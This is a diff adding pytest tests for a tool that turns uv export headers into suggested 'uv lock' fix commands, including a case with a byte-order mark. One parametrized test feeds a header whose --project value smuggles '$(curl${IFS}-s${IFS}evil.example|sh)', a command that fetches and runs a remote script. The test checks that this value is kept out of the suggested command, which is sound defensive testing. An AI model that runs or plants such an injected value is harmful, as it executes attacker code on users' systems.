@@ -1462,6 +1462,33 @@ def test_fix_compiled_hashed_reqs_still_say_pip_compile(capsys, fake_pypi, gap_w
     assert "upgrade its lock instead" not in out
 
 
+def test_fix_uv_export_header_after_a_byte_order_mark(capsys, fake_pypi, gap_wheels, tmp_path):
+    # A Windows editor may save the export with a BOM: line 1 is still uv's header.
+    reqs = _fixme_requirements(tmp_path, _UV_EXPORT.format(command="uv export -o requirements.txt") + _HASHED_FIXME)
+    path = tmp_path / "requirements.txt"
+    path.write_bytes(b"\xef\xbb\xbf" + path.read_bytes())
+    _, out, _ = run(capsys, reqs, "-p", "3.14t", "-t", "win-arm64", "--fix")
+    assert "upgrade its lock instead: run uv lock --upgrade-package fixme;" in out
+    assert "pip-compile" not in out
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "uv export --project=$(curl${IFS}-s${IFS}evil.example|sh) -o requirements.txt",
+        'uv export --project "my app" -o requirements.txt',
+    ],
+)
+def test_fix_uv_export_header_options_that_arent_plain_paths_stay_out_of_the_command(
+    capsys, fake_pypi, gap_wheels, tmp_path, command
+):
+    # The header is the file's text, not ours: a value that isn't a plain path isn't put into a command to run.
+    reqs = _fixme_requirements(tmp_path, _UV_EXPORT.format(command=command) + _HASHED_FIXME)
+    _, out, _ = run(capsys, reqs, "-p", "3.14t", "-t", "win-arm64", "--fix")
+    assert "run uv lock --upgrade-package fixme with the export's --script, --project or --directory option;" in out
+    assert "uv lock --project" not in out
+
+
 def test_fix_uv_export_header_backticks_stay_out_of_markdown(capsys, fake_pypi, gap_wheels, tmp_path):
     command = "uv export -o `requirements.txt`"
     reqs = _fixme_requirements(tmp_path, _UV_EXPORT.format(command=command) + _HASHED_FIXME)
